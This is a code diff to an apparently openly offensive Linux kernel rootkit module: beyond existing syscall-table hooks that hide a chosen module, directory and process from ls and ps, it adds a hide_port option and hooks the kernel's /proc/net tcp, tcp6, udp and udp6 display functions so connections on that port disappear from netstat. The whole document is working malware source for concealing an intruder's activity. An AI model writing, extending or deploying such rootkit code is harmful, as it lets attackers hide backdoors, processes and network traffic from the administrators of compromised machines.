@@ -14,11 +14,48 @@
 #include <linux/hash.h>
 #include <linux/dirent.h>
 
+#include <linux/inet_diag.h>	/* Needed for ntohs */
+#include <net/tcp.h>			/* Needed for struct tcp_seq_afinfo */
+#include <net/udp.h>			/* Needed for struct udp_seq_afinfo */
+
 struct linux_dirent {
 	unsigned long  d_ino;     /* Inode number */
 	unsigned long  d_off;     /* Offset to next linux_dirent */
 	unsigned short d_reclen;  /* Length of this linux_dirent */
 	char           d_name[];  /* Filename (null-terminated) */
+};
+
+/*
+ * This is not completely implemented yet. The idea is to
+ * create an in-memory tree (like the actual /proc filesystem
+ * tree) of these proc_dir_entries, so that we can dynamically
+ * add new files to /proc.
+ *
+ * parent/subdir are used for the directory structure (every /proc file has a
+ * parent, but "subdir" is empty for all non-directory entries).
+ * subdir_node is used to build the rb tree "subdir" of the parent.
+ */
+struct proc_dir_entry {
+		unsigned int low_ino;
+		umode_t mode;
+		nlink_t nlink;
+		kuid_t uid;
+		kgid_t gid;
+		loff_t size;
+		const struct inode_operations *proc_iops;
+		const struct file_operations *proc_fops;
+		struct proc_dir_entry *parent;
+		struct rb_root subdir;
+		struct rb_node subdir_node;
+		void *data;
+		atomic_t count;					/* use count */
+		atomic_t in_use;				/* number of callers into module in progress; */
+										/* negative -> it's going away RSN */
+		struct completion *pde_unload_completion;
+		struct list_head pde_openers;	/* who did ->open, but not ->release */
+		spinlock_t pde_unload_lock;		/* proc_fops checks and pde_users bumps */
+		u8 namelen;
+		char name[];
 };
 
 unsigned long cr0;
@@ -30,16 +67,28 @@ orig_getdents_t orig_getdents;
 typedef asmlinkage long (*orig_getdents_t64)(unsigned int, struct linux_dirent64 *, unsigned int);
 orig_getdents_t64 orig_getdents64;
 
+asmlinkage int (*original_tcp4_show) (struct seq_file *, void *);
+asmlinkage int (*original_tcp6_show) (struct seq_file *, void *);
+asmlinkage int (*original_udp4_show) (struct seq_file *, void *);
+asmlinkage int (*original_udp6_show) (struct seq_file *, void *);
+
+static int my_tcp4_show(struct seq_file *, void *);
+static int my_tcp6_show(struct seq_file *, void *);
+static int my_udp4_show(struct seq_file *, void *);
+static int my_udp6_show(struct seq_file *, void *);
+
 #define START_MEM PAGE_OFFSET
 #define END_MEM ULONG_MAX
 
 static char *hide_mod = "";
 static char *hide_dir = "N0TH1NG";
 static int hide_pid = -1;
+static int hide_port = -1;
 
 module_param(hide_mod, charp, 0000); // which lkm should be deleted from kernel structures
 module_param(hide_dir, charp, 0000); // which directory/file should be hidden from ls
 module_param(hide_pid, int, 0000);	 // which pid process should be hidden from ps
+module_param(hide_port, int, 0000);	 // which port should be hidden from netstat
 MODULE_LICENSE("GPL v2"); // this actually solves a lot of bugs
 
 // get syscall table dinamically
@@ -209,6 +258,79 @@ hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int cou
     return or;
 }
 
+/* The functions below emulate the original seq functions of tcp and udp but return a
+   length of zero if the given socket uses a hidden port as source or destination port. */
+static int my_tcp4_show(struct seq_file *m, void *v)
+{
+	struct inet_sock *inet;
+	int port;
+
+	if (SEQ_START_TOKEN == v)
+		return original_tcp4_show(m, v);
+
+	inet = inet_sk((struct sock *) v);
+	port = ntohs(inet->inet_sport);
+
+	if (port == hide_port)
+		return 0;
+
+	return original_tcp4_show(m, v);
+}
+
+
+static int my_tcp6_show(struct seq_file *m, void *v)
+{
+	struct inet_sock *inet;
+	int port;
+
+	if (SEQ_START_TOKEN == v)
+		return original_tcp6_show(m, v);
+
+	inet = inet_sk((struct sock *) v);
+	port = ntohs(inet->inet_sport);
+
+	if (port == hide_port)
+		return 0;
+
+	return original_tcp6_show(m, v);
+}
+
+
+static int my_udp4_show(struct seq_file *m, void *v)
+{
+	struct inet_sock *inet;
+	int port;
+
+	if (SEQ_START_TOKEN == v)
+		return original_udp4_show(m, v);
+
+	inet = inet_sk((struct sock *) v);
+	port = ntohs(inet->inet_sport);
+
+	if (port == hide_port)
+		return 0;
+
+	return original_udp4_show(m, v);
+}
+
+
+static int my_udp6_show(struct seq_file *m, void *v)
+{
+	struct inet_sock *inet;
+	int port;
+
+	if (SEQ_START_TOKEN == v)
+		return original_udp6_show(m, v);
+
+	inet = inet_sk((struct sock *) v);
+	port = ntohs(inet->inet_sport);
+
+	if (port == hide_port)
+		return 0;
+
+	return original_udp6_show(m, v);
+}
+
 static void module_hide(struct module *mod){
     /*
     list_del(&mod->list);
@@ -252,6 +374,53 @@ syshook_init(void) {
     sys_call_table[__NR_getdents64] = (unsigned long)hacked_getdents64;
     write_cr0(cr0);
 
+	struct rb_root proc_rb_root;
+	struct rb_node *proc_rb_last, *proc_rb_nodeptr;
+	struct proc_dir_entry *proc_dir_entryptr;
+	struct tcp_seq_afinfo *tcp_seq;
+	struct udp_seq_afinfo *udp_seq;
+
+	/* Get the proc dir entry for /proc/<pid>/net */
+	proc_rb_root = init_net.proc_net->subdir;
+
+	proc_rb_last = rb_last(&proc_rb_root);
+	proc_rb_nodeptr = rb_first(&proc_rb_root);
+
+	while (proc_rb_nodeptr != proc_rb_last) {
+		proc_dir_entryptr = rb_entry(proc_rb_nodeptr, struct proc_dir_entry, subdir_node);
+
+		//PRINT(proc_dir_entryptr->name);
+
+		/* Search for the entries called tcp, tcp6, udp and udp6 */
+		if (!strcmp(proc_dir_entryptr->name, "tcp")) {
+			tcp_seq = proc_dir_entryptr->data;
+			original_tcp4_show = tcp_seq->seq_ops.show;
+
+			/* Hook the kernel function tcp4_seq_show */
+			tcp_seq->seq_ops.show = my_tcp4_show;
+		} else if (!strcmp(proc_dir_entryptr->name, "tcp6")) {
+			tcp_seq = proc_dir_entryptr->data;
+			original_tcp6_show = tcp_seq->seq_ops.show;
+
+			/* Hook the kernel function tcp6_seq_show */
+			tcp_seq->seq_ops.show = my_tcp6_show;
+		} else if  (!strcmp(proc_dir_entryptr->name, "udp")) {
+			udp_seq = proc_dir_entryptr->data;
+			original_udp4_show = udp_seq->seq_ops.show;
+
+			/* Hook the kernel function udp4_seq_show */
+			udp_seq->seq_ops.show = my_udp4_show;
+		} else if (!strcmp(proc_dir_entryptr->name, "udp6")) {
+			udp_seq = proc_dir_entryptr->data;
+			original_udp6_show = udp_seq->seq_ops.show;
+
+			/* Hook the kernel function udp6_seq_show */
+			udp_seq->seq_ops.show = my_udp6_show;
+		}
+
+		proc_rb_nodeptr = rb_next(proc_rb_nodeptr);
+	}
+
     return 0;
 }
 
@@ -267,6 +436,38 @@ syshook_cleanup(void){
         sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
         write_cr0(cr0);
     }
+
+	struct rb_root proc_rb_root;
+	struct rb_node *proc_rb_last, *proc_rb_nodeptr;
+	struct proc_dir_entry *proc_dir_entryptr;
+	struct tcp_seq_afinfo *tcp_seq;
+	struct udp_seq_afinfo *udp_seq;
+
+	proc_rb_root = init_net.proc_net->subdir;
+	proc_rb_last = rb_last(&proc_rb_root);
+	proc_rb_nodeptr = rb_first(&proc_rb_root);
+
+	while (proc_rb_nodeptr != proc_rb_last) {
+		proc_dir_entryptr = rb_entry(proc_rb_nodeptr, struct proc_dir_entry, subdir_node);
+
+		//PRINT(proc_dir_entryptr->name);
+
+		if (!strcmp(proc_dir_entryptr->name, "tcp")) {
+			tcp_seq = proc_dir_entryptr->data;
+			tcp_seq->seq_ops.show = original_tcp4_show;
+		} else if (!strcmp(proc_dir_entryptr->name, "tcp6")) {
+			tcp_seq = proc_dir_entryptr->data;
+			tcp_seq->seq_ops.show = original_tcp6_show;
+		} else if (!strcmp(proc_dir_entryptr->name, "udp")) {
+			udp_seq = proc_dir_entryptr->data;
+			udp_seq->seq_ops.show = original_udp4_show;
+		} else if (!strcmp(proc_dir_entryptr->name, "udp6")) {
+			udp_seq = proc_dir_entryptr->data;
+			udp_seq->seq_ops.show = original_udp6_show;
+		}
+
+		proc_rb_nodeptr = rb_next(proc_rb_nodeptr);
+	}
 }
 
 module_init(syshook_init);
